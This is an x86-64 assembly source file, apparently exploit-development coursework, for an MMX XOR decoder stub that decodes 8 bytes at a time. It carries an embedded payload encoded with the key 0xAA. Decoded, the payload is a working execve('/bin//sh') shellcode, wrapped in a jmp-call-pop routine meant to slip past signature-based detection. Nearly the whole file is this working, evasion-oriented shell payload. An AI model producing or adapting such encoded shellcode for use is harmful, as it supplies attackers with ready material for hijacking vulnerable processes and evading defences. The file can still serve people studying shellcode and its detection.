; Author : Abhinav Thakur
; Email  : compilepeace@gmail.com
;
; Description : This is a mmx xor decoder. This decoder takes in 8 bytes at a time to decode
;				the shellcode unlike other decoders which used 1 byte at a time.
;
; SHELLCODE LENGTH = 75 bytes 
;


global _start


section .text
_start:

	jmp	PushAddress


Decoder:

	pop	rsi				; Address of Decoding byte
	lea	rdi, [rsi + 8]	; RDI points to the encoded shellcode

	xor rcx, rcx		; Zero out RCX
	mov cl, 0x4			; To make sure the loop runs 4 times (i.e. 8 bytes decoded at once for
						;  30 bytes)

	
Decode:
	
	movq mm0, QWORD [rdi]
	movq mm1, QWORD [rsi]
	pxor mm0, mm1
	
	movq QWORD [rdi], mm0
	add	rdi, 0x8
	loop Decode	

	jmp encoded_shellcode


PushAddress:
	
	call Decoder
	decoding_byte:	db	0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA 
	encoded_shellcode:	db	0xe2,0x9b,0x6a,0xfa,0xe2,0x11,0x85,0xc8,0xc3,0xc4,0x85,0x85,0xd9,0xc2,0xf9,0xe2,0x23,0x4d,0xfa,0xe2,0x23,0x48,0xfd,0xe2,0x23,0x4c,0x1a,0x91,0xa5,0xaf	
